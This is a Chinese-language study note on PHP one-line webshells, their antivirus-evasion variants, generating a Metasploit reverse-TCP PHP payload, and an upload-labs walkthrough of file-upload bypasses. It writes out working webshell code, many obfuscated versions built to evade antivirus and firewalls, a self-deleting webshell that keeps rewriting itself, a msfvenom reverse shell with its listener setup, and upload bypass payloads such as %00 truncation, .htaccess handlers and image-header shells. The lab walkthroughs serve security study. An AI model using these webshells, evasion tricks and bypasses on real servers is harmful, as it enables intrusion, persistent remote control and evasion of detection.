# 一句话和文件上传（一句话木马原理和免杀及生成、文件上传原理、文件上传漏洞原理、文件上传靶场、文件包含漏洞）

# 认识一句话木马【远程控制类代码】——web版本

使用工具：PHPstudy

需要掌握如何使用工具去制作一句话木马

打开PHPstudy，进入www目录，新建muma.php



## 关于eval()

```
eval('xxxxxx')
eval()可以把括号里它包裹起来的所有字符串当做代码来进行解析
@ 报错不显示 
```

比如：

```
<?php
echo 'echo "haha";';
?>
此时不会再执行一次echo

<?php
eval("echo 'haha';")
?>
此时就会输出haha
```

![image-20220116192326810](01 认识一句话木马.assets/image-20220116192326810.png)



## 关于system()

```
<?php
system("ipconfig");
?>
```

![image-20220116192607041](01 认识一句话木马.assets/image-20220116192607041.png)



此时system()里的字符串也被当做系统命令代码来进行解析.

system函数执行完可以直接输出。



## 关于exec()

```
<?php
exec("ipconfig");
?>
此时什么也没有显示

<?php
$a = exec("ipconfig");
echo $a;
?>
```

![image-20220116192939393](01 认识一句话木马.assets/image-20220116192939393.png)



exec()可以输出()里的字符串当做系统命令代码，但长度有限制

但是：

```
<?php
$a = exec("mkdir nihao");
echo $a;
?>
```



![image-20220116193054912](01 认识一句话木马.assets/image-20220116193054912.png)

因此可得：exec()一定要有东西接它



## 关于一句话木马

```
<?php
eval($_POST['a'])        //需要与web互动，那么需要post或get提交的语句
?>

<?php eval($_POST['a']) ?>     //一句话木马
# 将post进来的abc参数的参数值当做php代码执行

<?php eval($_GET['a']) ?>
# 或get提交

#提交时记得输入分号
或<?php eval($_GET['a'].";") ?>
就不需要输入分号

一句话木马越小越好：
<?php eval($_POST['a']) ?> 
```

那么此时去传参处输入指令：

![image-20220116193713740](01 认识一句话木马.assets/image-20220116193713740.png)

![image-20220116193810594](01 认识一句话木马.assets/image-20220116193810594.png)

那么也可以查看当前文件夹：

![image-20220116194017116](01 认识一句话木马.assets/image-20220116194017116.png)



综上，如果把一句话木马加入到别人的程序里，那么就可以控制对方的电脑。



## 使用工具写一句话木马——中国菜刀（或蚁剑、kali工具等）

实质上是一个替你输入一句话木马的工具。



### 使用方法：

右键添加：

![image-20220116194736976](01 认识一句话木马.assets/image-20220116194736976.png)

填入安放木马的地址：

![image-20220116194803055](01 认识一句话木马.assets/image-20220116194803055.png)

地址后面写入密码，即递交的参数：

![image-20220116194828811](01 认识一句话木马.assets/image-20220116194828811.png)

![image-20220116194848866](01 认识一句话木马.assets/image-20220116194848866.png)

选择语言和编码方式：

![image-20220116194909818](01 认识一句话木马.assets/image-20220116194909818.png)

添加成功，然后会连接一句话木马：

![image-20220116194926190](01 认识一句话木马.assets/image-20220116194926190.png)

双击：

![image-20220116195011838](01 认识一句话木马.assets/image-20220116195011838.png)

然后就可以很轻松地控制对方的电脑，但是如果没有提权的话，权限也会有限制



关于虚拟终端：

![image-20220116195113669](01 认识一句话木马.assets/image-20220116195113669.png)

即在对方电脑上模拟运行cmd



一般测试情况，运行一句话木马，只需要让它执行输出`phpinfo()`就可以了



比如上传漏洞时，只要让它上传`<?php phpinfo();?>`即可

——大多数情况测试文件上传漏洞都用这个，能出现就证明成功了





# 一句话木马的免杀

安装php5.5.9和5.6.9版本

![image-20220116195622556](02 一句话木马的免杀.assets/image-20220116195622556.png)

然后换低版本

测试木马的免杀：

virustotal



关于一句话木马免杀：

```
<?php eval($_POST['ABC']);?>
```

杀毒一般会针对`eval`

那么我们换一个函数：`assert()`可以代替`eval()`的作用

```
<?php assert($_POST['ABC']);?>
```

说明黑客会使用此种方法代替eval

那么如果杀毒软件把上述两种都杀掉：



思考——绕过防火墙的方法：

【下述方法结合使用】

**字符替换**：

```
<?php
$a = substr_replace("assexx","rt",4);
$a($_POST['ABC']);
?>
```

利用**函数传参：**

```
<?php
function haha($a){
$a($_POST['ABC']);
}           //function表示函数
haha(assert);     //此时assert不用加引号，因为表示一个内存地址
?>
```

或**将行为当做函数的参数**：

```
<?php
function haha($a){
assert($a);
}           //function表示函数
haha($_POST['ABC']);     //此时assert不用加引号，因为表示一个内存地址
?>
```

**换一行输出：**

```
<?php
$a = $_REQUEST['a'];
$b = "\n";     //php里如果需要使用\，得用""！！！
eval($b.=$a);
>

//每次输入的代码都换一行输出
//REQUEST表示GET和POST一起，都可以接收
//在杀post提交时可用
```

**利用析构函数**和**面向对象的函数**：

析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。

```
<?php
class me          //定义一个类
{
public $a='';     //属性
function __destruct(){     //析构函数
assert("$this->a");    //调用a变量里的东西去当做php代码执行
}
}
//初始化me的类
$b = new me;    //新建一个对象
$b->$a=$_POST['a'];     
?>
```

完全屏蔽了assert，**使用base64编码和解码（一次或多次）**：

```
<?php
$a = base64_decode("YXNzZXJ0");   //assert的base64加密
$a($_POST['abc']);
?>
```

**使用拆解：**

```
<?php
$a = "a"."s";
$b = "s"."e"."r"."t";
$c = $a.$b;
$c($_POST['abc']);
?>
```

**使用正则表达式替换**：

```
<?php
function fun(){
return $_POST['a'];
}
@preg_replace("/haha/e",fun(),"haha");    //使用正则表达式，e代表excute执行的意思
?>

//使用正则表达式把haha替换为fun()去执行，而此时后面有一个haha可以被替换执行
```

```
@让php不输出错误，增加隐蔽功能！！！！
```

**让防火墙无法追踪，接力传参**：

```
<?php
if(isset($_POST['file'])){        //判断是否有输入参数
$d = 'data';     //定义一个字符
$$d = $_POST['text'];           //使用双$符=$data
$f = 'fp';
$$f = fopen($_POST['file'],'wb');   //$fp变量为，打开文件，并用二进制进行保存——wb表示文件权限为写入二进制代码
echo fwrite($fp,$data)?'save success':'save fail';       //写入文件，并判断是否写入成功
fclose($fp);
}
?>

让防火墙看不到我们的变量
此时打开这个php文件，post的参数时file=nn.php&text=一句话木马
然后会在当前目录下创建一个叫nn.php的文件并写入一句话木马
```

然后传参写入一句话木马即可：

![image-20220116203445854](02 一句话木马的免杀.assets/image-20220116203445854.png)

然后目标的服务器上多了一个文件nn.php，文件里被写上了一句话木马

此时再去访问目标的nn.php，就可以执行命令了：

![image-20220116203605380](02 一句话木马的免杀.assets/image-20220116203605380.png)



**使用正则表达式，用替换去掉中括号，然后解base64码执行:**

```
<?php 
@$a=$_POST['Hello'];
if(isset($a)){    //如果提交了参数

	//\\1指的是(.*)——这个斜杠跟一个数字是前向引用的意思。比如前面用括号捕获了一个子匹配，斜杠数字就表示和子匹配一样的内容，第一个子匹配就是\1，第二就是\2。
    
  //[@eval(base64_decode($_POST[z0]));]
   //使用正则表达式将[]里的东西(.*)替换成(.*)本身执行：
  //@eval(base64_decode($_POST[z0]));
  
  //[@eval(base64_decode($_POST[z0]));]
  //W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=
  
  @preg_replace("/\[(.*)\]/e", '\\1', base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10='));
 
}
?>

//使用方法：
Hello=aaa&z0=cGhwaW5mbygpOw==
```



**进程运行，只有把进程干掉，才可以删除的木马：**

```
<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file="./.index.php";
$code='<?php if(md5($_POST["pass"])=="01ddae4032e17a1c338baac9c4322b30"){@eval($_POST[a]);}';
while(1){
  file_put_contents($file, $code);
  usleep(5000);
}
?> 

使用方法，执行muma.php
pass=haha123&a=phpinfo();
```

防御方法：

1重启php服务器，可以删除

2使用竞争写入（Python）

3创建一个.index.php名字的文件夹







# kali生成功能较多的php木马

kali

使用msf制作一个php木马：

```
msfvenom -p php/meterpreter/reverese_tcp lhost=10.3.32.95 lport=4444 -f raw > /root/shell.php
//raw格式-代码格式
```

生成一个shell.php：

![image-20220116204246834](03 kali生成一句话木马.assets/image-20220116204246834.png)

下载到本机，用文本打开可以查看：

![image-20220116204329815](03 kali生成一句话木马.assets/image-20220116204329815.png)



比如把该木马放到了目标电脑上，

在kali里使用msf：

```
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverese_tcp
show options
set lport 4444
set lhost 10.3.32.95
run
开始监听
```

然后让目标触发该木马：

![image-20220116204730147](03 kali生成一句话木马.assets/image-20220116204730147.png)

然后发现在转圈：

![image-20220116204756072](03 kali生成一句话木马.assets/image-20220116204756072-164233727682914.png)

此时就已经连接上了：

![image-20220116204823261](03 kali生成一句话木马.assets/image-20220116204823261.png)

然后可以让它执行一些命令例如shell等。

但是需要让它一直运行的话，就需要浏览器一直“正在连接”






# 文件上传原理



## 基本原理：

www目录下

创建一个新的文件：

### 前端：

wenjian.html

```php+HTML
<html>
    <head>
        <meta charset="utf-8">
        <title>文件测试</title>
    </head>
    
    <body>
        //文件上传即提交表单——form——action发送到某个php文件[chluli.php]去执行——method使用的提交方式——enctype需要上传文件的格式设置为multipart
        <form action="./chuli.php" method="POST" enctype="multipart/form-data">
            <label>这里传文件：</label> 
            <br/>
            <input type="file" name="wenjian" />
            //上传类型，name是等会php接到的post里面的参数值
            <br/>
            <input  type="submit" name="submit" value="点我开始上传"/>
            //类型为提交，
        </form>
    </body>
    
</html>

```

保存后此时前端：

![image-20220117090245618](01 文件上传原理.assets/image-20220117090245618.png)

点击浏览选择我们的php文件上传之后，页面就会转到chuli.php文件里：

![image-20220117090337682](01 文件上传原理.assets/image-20220117090337682.png)

因此，此时我们需要在chuli.php文件里写入指令

### php后端：

chuli.php

```php+HTML
<?php

//接收来自对方的文件
$fileinfo = $_FILES['wenjian'];

//获得文件名
echo $_FILES['wenjian']['name'];

echo '<br/>';

//查看文件信息
print_r($fileinfo);
    

?>
```

![image-20220117105844724](01 文件上传原理.assets/image-20220117105844724.png)

**需要更改文件存储地址：**

```php+HTML
<?php 

//接收来自对方的文件
$fileinfo = $_FILES['wenjian'];

//获得文件名
//echo $_FILES['wenjian']['name'];

//echo '<br/>';

//查看文件信息
print_r($fileinfo);

//获得文件名
$filename = $fileinfo["name"];

//获得文件临时路径
$filetmp_path = $fileinfo["tmp_name"];

//把图片从临时路径挪到你要的地方
move_uploaded_file($filetmp_path, "./pic/".$filename);

?>
```





# 利用文件上传漏洞

## 靶场

upload-labs

【可使用PHPstudy搭建】



## 基本：

桌面创建一个假装是木马的文件1.php：

```
<?php phpinfo()?>
```

如果能把该文件上传并让它执行就证明这个文件上传的网站是存在漏洞的

![img](02 利用文件上传漏洞md.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

## pass01——前端验证（js验证拦截）

尝试上传：

![image-20220117135754256](02 利用文件上传漏洞md.assets/image-20220117135754256.png)

查看源代码：

![image-20220117135703839](02 利用文件上传漏洞md.assets/image-20220117135703839.png)

属于js的代码。

查看提示：

![image-20220117135921991](02 利用文件上传漏洞md.assets/image-20220117135921991.png)

可以利用插件禁用js：

![image-20220117112044675](02 利用文件上传漏洞md.assets/image-20220117112044675.png)

![image-20220117140128347](02 利用文件上传漏洞md.assets/image-20220117140128347.png)

**关闭js**，然后访问127.0.0.1/upload可以：

![image-20220117140246570](02 利用文件上传漏洞md.assets/image-20220117140246570.png)

或者在f12里面修改拦截的代码即可



## pass2——mime校验（拦截文件类型）

尝试上传：

![image-20220117143254276](02 利用文件上传漏洞md.assets/image-20220117143254276.png)

查看源码：

![image-20220117143455694](02 利用文件上传漏洞md.assets/image-20220117143455694.png)

（代码审计）

查看提示：

![image-20220117143508594](02 利用文件上传漏洞md.assets/image-20220117143508594.png)

我们可以对数据包进行操作：**使用burpsuite抓包修改提交的Content-Type为允许的字段**：

![image-20220117162828237](02 利用文件上传漏洞md.assets/image-20220117162828237.png)

![image-20220117162914563](02 利用文件上传漏洞md.assets/image-20220117162914563.png)

成功

![image-20220117162956055](02 利用文件上传漏洞md.assets/image-20220117162956055.png)



## 关于php常用字符处理函数

### trim()——首尾去空

```
<?php

$a = "     wo jin tian lai LE!    ";
$b = trim($a);        //首尾去空
echo $b;

?>
```

![image-20220117164151297](02 利用文件上传漏洞md.assets/image-20220117164151297.png)



### deldot()——删除文件名末尾的点

```
<?php

$a = "nihao.php.";
$b = deldot($a);        //删除文件名末尾的点
echo $b;

?>
```



### strrchr()——寻找.以及输出之后的东西

```
<?php

$a = "wenjian.php";
$b = strrchr($a,'.');        //寻找.以及输出之后的东西
echo $b;

?>
```



### strtolower()——转为小写

```
<?php

$a = "HAHA ni hao";
$b = strtolower($a);        //转为小写
echo $b;

?>
```



### str_ireplace——替换

```
<?php

$a = "abcdefg";
$b = str_ireplace("b","x",$a);        //在$a上把b替换成x
echo $b;

?>
```



## pass3——文件名解析绕过黑名单

查看源码：

![image-20220117172137285](02 利用文件上传漏洞md.assets/image-20220117172137285.png)

分析源码。

查看提示：

![image-20220117172211803](02 利用文件上传漏洞md.assets/image-20220117172211803.png)

尝试正常上传文件：

![image-20220117172321245](02 利用文件上传漏洞md.assets/image-20220117172321245.png)

发现文件名根据时间被随机数命名了。

思考如何跳过它的防守——**黑名单**——凡是出现在黑名单的都不让过：

但是在PHP中：

```
.php = php3 php4 pht phtml 都可以被解析
```

### 小知识：

如何在Apache服务器中调整解析：

![image-20220117172840701](02 利用文件上传漏洞md.assets/image-20220117172840701.png)

点击Apache，在配置文件中搜索AddType：

![image-20220117172920880](02 利用文件上传漏洞md.assets/image-20220117172920880.png)

往下找，添加：

```
AddType application/x-httpd-php .php .pht .phtml
```

![image-20220117173023799](02 利用文件上传漏洞md.assets/image-20220117173023799.png)

保存然后重启Apache。



然后把要上传的文件后缀名改为上述可解析的其他后缀名即可。



## pass4——利用.htaccess文件

查看提示：

![image-20220117173540949](02 利用文件上传漏洞md.assets/image-20220117173540949.png)

查看源码：

![image-20220117173512087](02 利用文件上传漏洞md.assets/image-20220117173512087.png)

拦截的东西很多。



### 小知识：

（不推荐使用这个打法）

**在apache中`.htaccess`文件的作用是把其所在文件下你指定的xxxx类型的东西当作xxxx来执行**——是PHP的一个解析文件，根据文件写的规则，会把相应的东西当做php来执行。

文件夹下应该自己有的，如果没有就新建，打开写入：

```
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>

//此时会把所有文件名包含jpg的文件当作php来执行
```



那么我们把这个文件放到upload的目录下，然后上传.jpg的文件就可以被当做php文件来执行了



## pass5——include.php文件包含漏洞绕过

查看提示：

![image-20220117174536815](02 利用文件上传漏洞md.assets/image-20220117174536815.png)

查看源码：

![image-20220117174550840](02 利用文件上传漏洞md.assets/image-20220117174550840-1642412751401110.png)



会用到include.php

![image-20220117174644445](02 利用文件上传漏洞md.assets/image-20220117174644445.png)

![image-20220117174659341](02 利用文件上传漏洞md.assets/image-20220117174659341.png)

当我们把php一句话木马的文件后缀名改为jpg，然后上传，可以上传但是直接访问文件会出现错误。

但是网页中出现了：

![image-20220117174922530](02 利用文件上传漏洞md.assets/image-20220117174922530.png)

利用include.php的文件包含漏洞——php的文件包含会把本地中的任何一个包含的文件当作php代码执行：

当访问本地文件包含地址：

```
http://127.0.0.1:81/include.php?file=./upload/haha.jpg
```

![image-20220117175249490](02 利用文件上传漏洞md.assets/image-20220117175249490.png)



## pass6——后缀大小写绕过

查看提示

![image-20220117175552937](02 利用文件上传漏洞md.assets/image-20220117175552937.png)

查看源代码

![image-20220117175529870](02 利用文件上传漏洞md.assets/image-20220117175529870.png)

发现文件后缀名过滤的命令里没有写过滤大小写，因此可以：

将后缀名改为：`phP`来绕过。

```
windows系统不区分大小写
linux严格区分大小写
```



## pass7——windows空格绕过

发现没有判断首位去空的过程。

Windows文件系统里面，文件后缀名不允许存在空格，

可以使用burp抓包，上传xxx.php+空格

```
haha.php    =haha.php
```

所以可以利用空格来绕过。



## pass8——windows 点绕过

windows系统：

Windows文件系统里面，文件后缀名不允许存在.，如果有就会删掉

可以使用burp抓包，上传xxx.php.

```
haha.php.=haha.php
```



## pass9——windows DATA绕过

`::$DATA`是windows的NTFS文件系统中的默认属性

可以使用burp抓包，上传`xxx.php::$DATA$`

意思就是让windows请求自己

```
haha.php::$DATA=haha.php
```



## pass10——windows追加绕过

方法1：

程序是从上到下执行的。

所以他拦截多少次，只要有次数，我们就多一次。

可以使用burp抓包，上传`xxx.php..`



方法2：

可以使用burp抓包，第一次上传文件名`xxx.php:jpg`

此时会生产一个空的xxx.php文件

第二次上传文件名xxx.>>>

此时会在空间中写入你的代码



## pass11——双写绕过

```
haha.phphpp
```



## pass12——get路径绕过——%00截断

**GET方法保存路径，可以使用%00截断**



查看源码发现它存储图片路径的save_path里有get请求

利用burp抓包发现提交路径是上一层的upload：

![image-20220118091927172](02 利用文件上传漏洞md.assets/image-20220118091927172.png)

漏洞出现在：

```
$img_path = $_GET['save_path']."/".rand(10,99).date("YmdHis").".".$file_ext;

意思是它自己去定义了一个存储路径
```

那我们就可以尝试修改存储路径的参数并把后面内容注释掉：

```
save_path=../upload/haha.php%00.jpg   //让电脑看到.后面的东西都是正常的
filename="haha.php.jpg"    //文件名也要改为jpg
```

![image-20220118092449773](02 利用文件上传漏洞md.assets/image-20220118092449773.png)



## pass13——post路径绕过——%00截断解码

post的%00截断

**post的数据包中，%00需要右键--convert selection--url---urldecode**

**Apache不会给%00进行自动解码，所以需要自己进行解码**



发现保存路径中使用了post：

```
$img_path = $_POST['save_path']."/".rand(10,99).date("YmdHis").".".$file_ext;
```

![image-20220118093035316](02 利用文件上传漏洞md.assets/image-20220118093035316.png)



### 小知识 get和post

针对%xx，post不会像get一样，对这些东西进行解码，尤其是%00

get实质是对地址进行一个请求，post是发送整个数据包，所以post会更安全一点并且携带的数据局也会更多一点。



所以需要：%00需要右键--convert selection--url---urldecode

![image-20220118093502571](02 利用文件上传漏洞md.assets/image-20220118093502571.png)

将%00转换成机器的%00（人类无法看到的）



## pass14——图片木马制作/添加文件头绕过

图片木马要配合文件包含去使用

### 小知识——制作图片木马

```
文件合并制作图片木马
copy kfc1.jpg /a + haha.php /b muma.jpg
```

用c32【查看二进制代码工具】打开看到实质是文件头+php文件内容



电脑有时会通过查看文件头来判断文件类型，那么就可以通过这点来绕过防火墙上传文件。



### 添加文件头——配合文件包含漏洞：

```
文件包含漏洞，include函数可以把包含的所有任意文件当作php来执行

GIF89a
<?php phpinfo()?>
木马上传之后，利用文件包含漏洞执行
http://127.0.0.1/include.php?file=./upload/4920220117144104.gif
```



### 使用c32:

直接把代码粘贴在图片文件末尾就可以了





## pass15——二次渲染

源代码出现了`imagecreatefromjpeg`的函数，即会把你上传的文件压缩，然后在内存里再去创建一个图片，这个图片里是没有PHP代码的，想当于这个服务器已经对你的图片进行了二次渲染，我们的木马就会失效。相当于把一个高清图片变成清晰度比较低的图片，其中很多代码都会进行一个压缩和修改。

——那么需要

#### **使用一个已经被渲染过并且依然包含木马代码的图片**，

打开这个图片会发现：

![image-20220118131512903](02 利用文件上传漏洞md.assets/image-20220118131512903.png)

里面有两个参数。

#### 使用文件包含去执行它：

```
/include.php?file=./upload/[图片名]
/include.php?file=./upload/23992.png&0=phpinfo()
POST提交：1=-1
```

#### 如何制造：

制造一个不能被再次渲染的文件（比如很小的png文件）并且包含代码——需要把一个渲染过的文件和没渲染过的文件同时拖到c32工具里，然后判断哪块代码是渲染前和渲染后都不会改变的，那就把木马放到那块代码中去。



## pass16、17——条件竞争

上传后，先把文件进行保存，然后再判断是否符合条件，如果判断结果正常就把文件进行重命名，不过不正常就unlink删除。

先把文件移动到文件夹，再判断，那么说明文件有那么一瞬间肯定在，所以需要使用burp等软件进行快速提交，达到让它删不过来。

![image-20220118132228022](02 利用文件上传漏洞md.assets/image-20220118132228022.png)

send ro intruder

然后clear

add

![image-20220118132325194](02 利用文件上传漏洞md.assets/image-20220118132325194.png)

![image-20220118132347673](02 利用文件上传漏洞md.assets/image-20220118132347673-1642483428206113.png)

![image-20220118132408913](02 利用文件上传漏洞md.assets/image-20220118132408913.png)

或者多线程：

![image-20220118132516022](02 利用文件上传漏洞md.assets/image-20220118132516022.png)

总结：

使用unlink来删除文件。

流程：先让你传文件，传到服务器上了，再进行判断，不符合就删除。

办法：使用burp抓包，send to intruder，payloads选择number

总有一天它来不及删。



## pass18——条件竞争——.7z

修改一下代码

![image-20220118132826981](02 利用文件上传漏洞md.assets/image-20220118132826981.png)

**如果看到代码中出现`.7z`、`.zip`、`.rar`、`.gz`这种压缩类型的文件，php有可能会自动解压。**

把上传文件改为：

![image-20220118133118848](02 利用文件上传漏洞md.assets/image-20220118133118848.png)

然后**如果发现目标需要给文件重命名，可以利用条件竞争，竞争上传的原理，快速提交**。

![image-20220118133155165](02 利用文件上传漏洞md.assets/image-20220118133155165.png)

x.php.7z会来不及被重命名，并且可以被当做php执行。



## pass19——move_uploaded_file()的00截断

查看提示

![img](02 利用文件上传漏洞md.assets/2018111017530776.png)

CVE-2015-2348

【**move_upload_file函数会忽略/.**】

move_uploaded_file() **00截断**，上传webshell，同时自定义保存名称，直接保存为php是不行的 

 发现move_uploaded_file()函数中的img_path是由**post参数**save_name控制的，因此可以在save_name利用00截断绕过： 


构造

![img](02 利用文件上传漏洞md.assets/20181110180207252.png)

或者

![img](02 利用文件上传漏洞md.assets/20181110180036908.png)

均可绕过

```
Content-Disposition: form-data; name="upload_file"; filename="haha.php"
Content-Type: image/jpeg

GIF89a
<?php phpinfo()?>
-----------------------------200222961522119
Content-Disposition: form-data; name="save_name[0]"

upload-20.php/
-----------------------------200222961522119
Content-Disposition: form-data; name="save_name[2]"

jpg
```





## pass20——数组代码审计

```php+HTML
<?php
if(!empty($_FILES['upload_file']))
{
	//检查MIME
	$allow_type = array('image/jpeg','image/png','image/gif');
	if(!in_array($_FILES['upload_file']['type'],$allow_type)){
    $msg = "禁止上传该类型文件!";
	}else{
   		 //检查文件名upload-20.php/.jpg,如果框是空的就使用原文件名
    	$file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : 
    	$_POST['save_name'];
        
        
    //$file数组：$file[0]=upload-20.php  [1]=null  [2]=jpg
    //如果不是数组，用.来把$file变成数组，如果本来就是数组，跳过此步骤
    if (!is_array($file)) {
    	//文件名小写，然后用.进行分割
        $file = explode('.', strtolower($file));
    }

    //拿到了数组的最后一个数据
    $ext = end($file);    //$ext = jpg
    $allow_suffix = array('jpg','png','gif');
    if (!in_array($ext, $allow_suffix)) {
        $msg = "禁止上传该后缀文件!";
    }else{
        //reset()把数组的内部指针重置到数组中的第一个元素
    	//$file=upload-20.php
        $file_name = reset($file) . '.' . $file[count($file) - 1];
        //$file_name =upload-20.php.[空]
        //利用%00阶段漏洞把它$file_name =upload-20.php.[空]
        
        //文件合并
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH . '/' .$file_name;
        if (move_uploaded_file($temp_file, $img_path)) {
            $msg = "文件上传成功！";
            $is_upload = true;
        } else {
            $msg = "文件上传失败！";
        }
    }


?>

备注:
$file = array(0=>'no1',2=>'no3' );
# $file数组中有2个元素
# $file[1]的结果是null
```

所以第一步利用神器把content-type修改，然后将数据包把参数修改成数组：

![image-20220118170747786](02 利用文件上传漏洞md.assets/image-20220118170747786.png)







靶场源码地址：[github.com/c0ny1/upload-labs](https://github.com/c0ny1/upload-labs)

我这里为了方便，就下载了靶主已经集成配置好的环境进行本地搭建。地址：[github.com/c0ny1/upload-labs/releases](https://github.com/c0ny1/upload-labs/releases)

本地搭建好是下面这个页面：

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

考察点：

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

 

直接开始

 

第一关

查看提示

![img](03 文件上传靶场笔记.assets/20181110120109181.png)

直接利用Burp Suite代理改后缀 ，或者利用插件禁用js。

![img](03 文件上传靶场笔记.assets/2018111011575248.png)

成功上传 

![img](03 文件上传靶场笔记.assets/20181110115844408.png)

 

第二关

查看提示

![img](03 文件上传靶场笔记.assets/20181110120154242.png)

利用Burp Suite修改Content-Type类型为 image/jpeg 

![img](03 文件上传靶场笔记.assets/20181110120336415.png)

成功上传

![img](03 文件上传靶场笔记.assets/20181110120423863.png)

 

第三关

查看提示

![img](03 文件上传靶场笔记.assets/20181110120604707.png)

修改后缀为php3依然会被解析

![img](03 文件上传靶场笔记.assets/20181110121008324.png)

 

成功上传

![img](03 文件上传靶场笔记.assets/20181110121052248.png)

 

第四关

查看提示

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

是**基于黑名单的方式**，这一关利用重写文件解析规则绕过  上传.htaccess文件(基于黑名单)

大概原理：

Apache中当上传到文件全部被解析为.jpg的后缀时。可以尝试一下后缀为.htaccess的文件。

<FilesMatch "4.jpg">
 SetHandler application/x-httpd-php
 </FilesMatch>

代码的含义 是 将上传的文件后缀名为`.jpg`格式的文件以 php格式来解析文件成功绕过

上传

![img](03 文件上传靶场笔记.assets/20181110122618746.png)

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

菜刀连接一下

可以直接用菜刀连接 http://127.0.0.1/upload/4.jpg

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

 

第五关

查看提示

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

这里无法使用.htaccess文件绕过

利用PHP 和 Windows环境的叠加特性，以下符号在正则匹配时的相等性：

```
双引号"     =   点号.
大于符号>   =   问号?
小于符号<   =   星号*
```

然后使用：截断上传， ：截断上传会使文件为空，可以利用上述特性再次上传 5.< 覆盖写入shell。

![img](03 文件上传靶场笔记.assets/20181110123720358.png)

![img](03 文件上传靶场笔记.assets/20181110123755300.png)

成功上传，但是大小为0KB。

再次上传

![img](03 文件上传靶场笔记.assets/20181110124203594.png)

成功写入

![img](03 文件上传靶场笔记.assets/20181110123941632.png)

 

参考链接: [www.waitalone.cn/php-windows-upload.html](https://www.waitalone.cn/php-windows-upload.html)

第六关

查看提示

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

依旧是黑名单过滤，查看源代码

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

还是利用Windows系统的文件名特性，文件名中不能出现点，冒号，空格等符号的特性，会直接消除

会被windows系统自动去掉不符合规则符号后面的内容

 

![img](03 文件上传靶场笔记.assets/20181110143839356.png)

在Burp Suite中修改其上传名加上 空格 绕过代码。

![img](03 文件上传靶场笔记.assets/20181110144118872.png)

成功上传

 

 

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70-164239783163862)

 

第七关

查看提示

![img](03 文件上传靶场笔记.assets/20181110144249480.png)

查看源代码

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

与上一关相比，并没有删除点  可以最后加点绕过

![img](03 文件上传靶场笔记.assets/20181110144847896.png)

成功

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

 

第八关

查看提示

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

查看源代码

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

这里没有过滤 ::$DATA 利用 Windows文件流特性绕过 构造8.php::$DATA 会被保存为8.php

当然我们也可以通过构造8.php. . 点空格点 绕过函数校验。

这里就演示构造8.php::$DATA

![img](03 文件上传靶场笔记.assets/20181110145936616.png)

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

第九关

查看提示

![img](03 文件上传靶场笔记.assets/20181110150049311.png)

查看源代码

